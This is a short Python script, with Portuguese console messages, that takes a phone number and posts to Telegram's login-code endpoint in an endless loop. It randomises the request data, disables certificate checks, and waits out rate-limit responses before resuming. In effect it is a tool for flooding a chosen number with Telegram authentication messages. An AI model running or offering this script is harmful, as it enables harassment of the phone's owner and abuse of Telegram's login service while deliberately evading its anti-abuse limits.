import requests
import time
from random import randint
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)

def send_telegram_request(phone_number):
    url = "https://my.telegram.org/auth/send_password"
    
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    data = {
        "phone": f"+{phone_number}",
        "random_hash": f"{randint(1000000000, 9999999999)}",
        "password": "0hnevgCjWdM",
        "remember": "1"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, verify=False)
        
        if response.status_code == 200:
            if "Sorry, too many tries" in response.text:
                print("Aviso do servidor: 'Sorry, too many tries. Please try again later.'")
                print("Parando por 10 minutos, para aguardar a normalização de tentativas...")
                time.sleep(600)
            else:
                print(f"Requisição bem-sucedida! Resposta: {response.text}")
        elif response.status_code == 429:
            print("Parando por 5 minutos, pois foi detectado um aviso de tentativas em massa...")
            time.sleep(300)
        else:
            print(f"Erro na requisição: Status {response.status_code} - {response.text}")
            time.sleep(30)
            
    except requests.exceptions.RequestException as e:
        print(f"Erro de conexão: {e}")
        time.sleep(60)

def main():
    phone_number = input("Digite o número de telefone (ex: 5511999151515): ").strip()
    
    print(f"Iniciando envio para o número +{phone_number}...")
    
    while True:
        send_telegram_request(phone_number)
        delay = randint(5, 15)
        print(f"Aguardando {delay} segundos antes da próxima tentativa...")
        time.sleep(delay)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProcesso interrompido pelo usuário. Até mais!")